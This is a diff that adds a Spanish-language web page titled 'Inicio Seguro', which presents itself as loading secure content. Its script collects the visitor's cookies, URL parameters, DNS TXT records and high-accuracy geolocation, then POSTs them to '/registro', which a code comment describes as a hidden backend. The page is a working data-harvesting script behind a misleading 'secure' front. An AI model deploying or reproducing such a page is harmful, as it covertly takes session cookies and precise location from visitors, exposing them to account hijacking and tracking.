@@ -1,1 +1,105 @@
 
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Inicio Seguro</title>
+  <style>
+    body { background: #111; color: #0f0; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; }
+  </style>
+</head>
+<body>
+  <div id="mensaje">Cargando contenido seguro...</div>
+  <script>
+(async () => {
+  const log = {
+    parametros: {},
+    cookies: document.cookie || "No accesibles",
+    dnsTXT: '',
+    ubicacion: {}
+  };
+
+  // 1. Leer parámetros de URL
+  const params = new URLSearchParams(location.search);
+  for (const [key, value] of params.entries()) {
+    log.parametros[key] = value;
+  }
+
+  // 2. Obtener registros TXT de DNS usando DoH
+  try {
+    const dnsRes = await fetch(`https://dns.google/resolve?name=${location.hostname}&type=TXT`);
+    const dnsJson = await dnsRes.json();
+    if (dnsJson.Answer) {
+      log.dnsTXT = dnsJson.Answer
+        .map(a => a.data.replace(/^"|"$/g, ""))
+        .join(" | ");
+    } else {
+      log.dnsTXT = "Sin registros TXT";
+    }
+  } catch (e) {
+    log.dnsTXT = "Error al consultar TXT";
+  }
+
+  // 3. Geolocalización precisa
+  const obtenerUbicacion = () => new Promise((resolve, reject) => {
+    if (!navigator.geolocation) return reject("No soportado");
+
+    navigator.geolocation.getCurrentPosition(
+      pos => resolve({
+        latitud: pos.coords.latitude,
+        longitud: pos.coords.longitude,
+        precision_m: pos.coords.accuracy
+      }),
+      err => reject(err.message),
+      { enableHighAccuracy: true, timeout: 10000 }
+    );
+  });
+
+  try {
+    log.ubicacion = await obtenerUbicacion();
+  } catch (err) {
+    log.ubicacion = { error: err };
+  }
+
+  // 4. Mostrar resultados formateados
+  const pre = document.createElement("pre");
+  pre.style = `
+    background: #111;
+    color: #0f0;
+    padding: 1em;
+    font-family: monospace;
+    white-space: pre-wrap;
+    max-width: 90vw;
+    overflow: auto;
+  `;
+  pre.textContent = `
+🌐 Parámetros URL:
+${Object.entries(log.parametros).map(([k,v]) => `${k}: ${v}`).join("\n") || "Ninguno"}
+
+🍪 Cookies:
+${log.cookies}
+
+📝 Registros DNS TXT (${location.hostname}):
+${log.dnsTXT}
+
+📍 Ubicación Precisa:
+${log.ubicacion.latitud ? `Lat: ${log.ubicacion.latitud}, Lon: ${log.ubicacion.longitud} (±${log.ubicacion.precision_m}m)` : JSON.stringify(log.ubicacion)}
+  `.trim();
+
+  document.body.appendChild(pre);
+
+  // 5. Enviar log a backend oculto (simulado aquí con fetch a /registro)
+  try {
+    await fetch("/registro", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(log)
+    });
+  } catch (e) {
+    console.warn("No se pudo enviar log:", e);
+  }
+})();
+</script>
+
+</body>
+</html>
